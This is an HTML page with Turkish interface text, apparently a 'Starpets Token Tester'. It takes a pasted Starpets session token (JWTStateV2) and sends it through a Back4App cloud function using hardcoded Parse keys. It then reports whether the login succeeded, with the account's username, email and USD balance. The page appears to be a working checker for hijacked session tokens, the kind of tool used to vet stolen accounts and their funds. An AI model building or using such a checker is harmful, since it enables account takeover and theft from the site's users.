<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Starpets Token Tester</title>
    <style>
        body { background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }
        textarea { width: 100%; height: 150px; background: #1a1a1a; color: #0f0; border: 1px solid #0f0; }
        button { background: #0f0; color: #000; padding: 10px 20px; margin-top: 10px; cursor: pointer; }
        .result { background: #1a1a1a; padding: 10px; margin-top: 10px; white-space: pre-wrap; }
        .loading { opacity: 0.5; pointer-events: none; }
    </style>
</head>
<body>
    <h1>🔑 Starpets Token Tester</h1>
    <textarea id="token" placeholder="JWTStateV2 degerini yapistir..."></textarea>
    <br>
    <button onclick="testWithCloudCode()">🚀 Cloud Code ile Test Et</button>
    <div id="result" class="result"></div>
    <div class="info" style="margin-top: 10px; color: #666;">
        💡 Cloud Code ile CORS sorunu yok! Backend uzerinden Starpets'e istek atilir.
    </div>

    <script>
        const APP_ID = 'l54T01o7jvdkUGKJJZau0LQ6rggbqqOZfZsnAfNI';
        const JS_KEY = 'QrgvxaEWdCk6elj8o3eeePOPM5vYj2fMrY4FHlhj';
        
        async function testWithCloudCode() {
            const token = document.getElementById('token').value.trim();
            const resultDiv = document.getElementById('result');
            const btn = event.target;
            
            if (!token) {
                resultDiv.innerHTML = '❌ Lütfen token girin!';
                return;
            }
            
            btn.classList.add('loading');
            btn.disabled = true;
            resultDiv.innerHTML = '⏳ Cloud Code calistiriliyor... Starpets\'e istek atiliyor...';
            
            try {
                const response = await fetch('https://parseapi.back4app.com/functions/testStarpetsLogin', {
                    method: 'POST',
                    headers: {
                        'X-Parse-Application-Id': APP_ID,
                        'X-Parse-JavaScript-Key': JS_KEY,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ token: token })
                });
                
                const data = await response.json();
                const result = data.result;
                
                if (result.success) {
                    resultDiv.innerHTML = `
✅ GIRIS BASARILI!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 Kullanici: ${result.username || 'Bilinmiyor'}
📧 Email: ${result.email || 'Bilinmiyor'}
💰 Token'daki Bakiye: ${result.balance || '0'} USD
📄 Sayfada Bulunan Bakiye: ${result.page_balance || 'Bulunamadi'}
📊 HTTP Status: ${result.status}
⏱️  Sure: ${result.time}s
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                    `;
                } else {
                    resultDiv.innerHTML = `
❌ GIRIS BASARISIZ!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 Mesaj: ${result.message}
📊 HTTP Status: ${result.status}
⏱️  Sure: ${result.time}s
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                    `;
                }
                
            } catch (error) {
                resultDiv.innerHTML = `❌ Cloud Code hatasi: ${error.message}`;
            }
            
            btn.classList.remove('loading');
            btn.disabled = false;
        }
    </script>
</body>
</html>
